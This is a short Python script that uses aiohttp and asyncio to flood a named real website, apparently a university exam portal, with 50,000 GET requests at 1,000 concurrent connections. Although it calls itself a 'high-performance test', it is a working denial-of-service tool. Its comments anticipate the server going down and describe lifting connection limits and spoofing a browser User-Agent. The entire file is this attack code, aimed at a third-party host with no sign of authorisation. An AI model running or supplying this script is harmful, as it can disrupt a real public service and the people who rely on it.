import aiohttp
import asyncio
import time

# --- CONFIGURATION ---
TARGET_URL = 'https://www.makautexam.net'  # Target URL to test against
MAX_CONCURRENT = 1000  # How many to run at the exact same time
TOTAL_REQUESTS = 50000 # Total attempts

async def send_request(session, request_id):
    try:
        # We use a randomized User-Agent here too for realism
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'keep-alive'
        }
        async with session.get(TARGET_URL, headers=headers, timeout=5) as response:
            # We don't need to read the body, just hitting the connection is enough
            if response.status == 200:
                print(f"[*] Request {request_id}: Success (200)", end='\r')
            else:
                print(f"[!] Request {request_id}: Status {response.status}", end='\r')
    except Exception:
        # This catches timeouts or "Connection Refused" if the server goes down
        pass

async def main():
    # TCPConnector allows us to ignore the standard limit of 100 connections
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"[*] Launching high-performance test on {TARGET_URL}")
        print(f"[*] Target concurrency: {MAX_CONCURRENT}")
        
        tasks = []
        for i in range(TOTAL_REQUESTS):
            # create_task is the key: it schedules the coroutine to run immediately
            task = asyncio.create_task(send_request(session, i))
            tasks.append(task)
            
            # This prevents your local RAM from exploding by managing batches
            if len(tasks) >= MAX_CONCURRENT:
                await asyncio.gather(*tasks)
                tasks = [] # Clear the batch and start the next
                # Small sleep to let the OS clear its network sockets
                await asyncio.sleep(0.1)

if __name__ == '__main__':
    start_time = time.time()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Manual stop detected.")
    
    end_time = time.time()
    print(f"\n[*] Test finished in {end_time - start_time:.2f} seconds.")